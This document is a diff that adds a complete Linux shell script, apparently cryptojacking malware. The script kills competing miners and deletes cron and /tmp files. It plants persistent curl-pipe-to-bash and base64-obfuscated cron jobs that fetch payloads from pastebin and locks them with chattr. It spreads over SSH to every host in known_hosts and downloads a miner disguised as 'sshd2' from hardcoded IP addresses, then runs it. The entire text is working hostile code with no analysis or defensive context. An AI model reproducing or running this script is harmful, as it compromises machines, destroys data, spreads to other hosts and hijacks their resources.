@@ -1,0 +1,122 @@
+#!/bin/sh
+export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '.ICEd-unix' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '/tmp/.ICE-' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep 'crun' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep 'javaupDates' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '4444' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '/tmp/jenkins' | awk '{print $2}' | xargs -I % kill -9 %
+crontab -l | sed '/xyz/d' | crontab -
+crontab -l | sed '/1eDKHr4r/d' | crontab -
+crontab -l | grep -e "aW1wb3J0IHVybGxp" | grep -v grep
+if [ $? -eq 0 ]; then
+  echo "cron good"
+else
+  (
+    crontab -l 2>/dev/null
+    echo "*/5 * * * * python -c \"import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYjIKaW1wb3J0IGd6aXAKaW1wb3J0IFN0cmluZ0lPCmZyb20gb3MgaW1wb3J0IHN5c3RlbQpzZW5kX2hlYWRlcnMgPSB7CiAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCcsCiAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsZGVmbGF0ZScKfQp1cmw9J2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ra01HVEVCNCcKcmVzcG9uc2UgPSB1cmxsaWIyLlJlcXVlc3QodXJsLCBoZWFkZXJzPXNlbmRfaGVhZGVycykKcmVxID0gdXJsbGliMi51cmxvcGVuKHJlc3BvbnNlKQpodG1sID0gcmVxLnJlYWQoKQpkYXRhID0gU3RyaW5nSU8uU3RyaW5nSU8oaHRtbCkKZ3ogPSBnemlwLkd6aXBGaWxlKGZpbGVvYmo9ZGF0YSkKaHRtbCA9IGd6LnJlYWQoKQpnei5jbG9zZSgpCndpdGggb3BlbignL3RtcC8ua2R0bXAnLCd3YicpIGFzIGY6CiAgICBmLndyaXRlKGh0bWwucmVwbGFjZSgnXHJcbicsJ1xuJykpCnN5c3RlbSgnYmFzaCAvdG1wLy5rZHRtcCcpCnN5c3RlbSgncm0gLWYgL3RtcC8ua2R0bXAnKQ=='))\" > /dev/null 2>&1"
+  ) | crontab -
+fi
+chmod +777 /tmp/*
+rm -f /usr/sbin/cron
+rm -f /usr/bin/kinsing*
+rm -f /etc/cron.d/kinsing*
+pkill node
+rm -f /usr/bin/node
+chattr -isa /var/spool/cron/*
+rm -rf /var/spool/cron/*
+pkill networkservice
+pkill networkser+
+pkill kdevtmpfs
+pkill watchbog
+chattr -isa /tmp/*
+chmod +rw /tmp/*
+rm -f /tmp/*
+rm -rf /var/tmp/kinsing
+mkdir /var/tmp/kinsing
+chmod -rw /var/tmp/kinsing
+mkdir /tmp/kdevtmpfsi
+chmod -rw /tmp/kdevtmpfsi
+chattr -i /etc/cron.d/root
+chattr -i /etc/cron.d/apache
+chattr -i /etc/cron.d/0hourly
+chattr -i /var/spool/cron/root
+chattr -i /var/spool/cron/crontabs/root
+chattr -i /usr/local/bin/dns
+rm -f /var/spool/cron/root
+rm -f /var/spool/cron/backup.db
+rm -f /var/spool/cron/dump.rdb
+rm -f /var/spool/cron/jw
+rm -f /var/spool/cron/uo
+rm -f /var/spool/cron/vf
+rm -f /var/spool/cron/admin
+rm -f /var/spool/cron/nginx
+rm -f /var/spool/cron/nobody
+rm -rf /var/spool/cron/*
+rm -f /var/spool/cron/crontabs/root
+rm -f /var/spool/cron/crontabs/dump.rdb
+rm -f /etc/cron.d/root
+rm -f /etc/cron.d/apache
+rm -f /etc/cron.d/0hourly
+rm -f /etc/cron.hourly/oanacroner
+rm -f /etc/cron.hourly/oanacrona
+rm -f /etc/cron.daily/oanacroner
+rm -f /etc/cron.daily/oanacrona
+rm -f /etc/cron.monthly/oanacroner
+rm -f /usr/local/bin/dns
+rm -f /etc/update.sh
+chattr -i /etc/sysupdate
+rm -f /etc/sysupdate
+rm -f /etc/config.json
+rm -f /var/tmp/kworkerds
+rm -f /usr/bin/.systemcero
+rm -f /usr/bin/cloudupdate
+rm -f /usr/bin/diskmanagerd
+rm -f /lib/libterminfo.so
+rm -f /bin/httpsntp
+rm -f /bin/ftpsntp
+rm -f /var/tmp/jspserv
+rm -f /tmp/jenkins
+chattr -isa /etc/crontab
+echo '*/10 * * * * root curl -fsSL https://pastebin.com/raw/qKcPmSNp | sh' > /etc/crontab
+chattr +isa /etc/crontab
+chattr -isa /var/spool/cron/root
+chattr -isa /var/spool/cron/crontabs/root
+echo '*/10 * * * * curl -fsSL https://pastebin.com/raw/qKcPmSNp | bash' >/var/spool/cron/root
+echo '*/10 * * * * curl -fsSL https://pastebin.com/raw/qKcPmSNp | bash' >/var/spool/cron/crontabs/root
+chattr +isa /var/spool/cron/root
+chattr +isa /var/spool/cron/crontabs/root
+chattr -isa /tmp/javax
+if [ -f /root/.ssh/known_hosts ]; then
+  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "curl -fsSL http://189.7.105.47:8181/examples/jsp/z0.txt | sh";done
+fi
+
+for file in /home/*
+do
+    if test -d $file; then
+        if [ -f $file/.ssh/known_hosts ]; then
+            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "curl -fsSL http://189.7.105.47:8181/examples/jsp/z0.txt | sh";done
+        fi
+    fi
+done
+p=$(ps auxf|grep sshd2|awk '{if($3>=70.0) print $2}')
+name=""$p
+if [ -z "$name" ]
+then
+    pkill config.sh
+    pkill sshd2
+    ps aux | grep -v grep | grep -v 'java\|redis\|mongod\|mysql' | awk '{if($3>60.0) print $2}' | xargs -I % kill -9 %
+    mkdir /tmp/javax
+    wget -q http://218.61.5.109/errors/config.json -O /tmp/javax/config.json
+    wget -q http://222.108.2.20/about/javae.exe -O /tmp/javax/sshd2
+    wget -q http://218.61.5.109/errors/config.sh -O /tmp/javax/config.sh
+    chmod +x /tmp/javax/sshd2
+    chmod +x /tmp/javax/config.sh
+    nohup /tmp/javax/config.sh &>>/dev/null &
+    sleep 10
+    rm -f /tmp/javax/config.sh
+else
+    exit
+fi
